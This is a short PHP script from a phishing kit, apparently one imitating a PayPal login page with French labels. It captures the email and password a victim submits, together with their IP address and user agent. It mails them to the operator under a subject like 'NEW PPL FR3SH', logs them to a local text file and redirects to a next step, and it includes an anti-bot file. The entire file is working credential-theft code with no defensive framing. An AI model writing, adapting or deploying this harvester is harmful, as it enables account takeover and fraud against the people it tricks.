<?php
	error_reporting(0);
	ob_start();
	session_start();

include '../antibots.php';
	include '../email.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
	$_SESSION['email'] 	= $_POST['mail'];
	$_SESSION['pass'] 	= $_POST['pass'];
$message = "
🎉Email : ".$_SESSION['email']."
🎉Mot-Pass : ".$_SESSION['pass']."
🎉IP: "._ip()."
🎉User Agent: ".$_SERVER["HTTP_USER_AGENT"]."
";
$Subject="  💲💲NEW PPL FR3SH💲💲|"._ip();
$head="From:⭐S4N70S⭐  <Login>";
mail($my_mail,$Subject,$message,$head);
$fil = fopen('0n_r3z_p4s_n0us.txt', 'a+');
fwrite($fil, '####################'.$message.'####################');
$_SESSION['step_one']  = true;
header('location: index.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));

}
else
{
	header('location: ../../index.php');
}
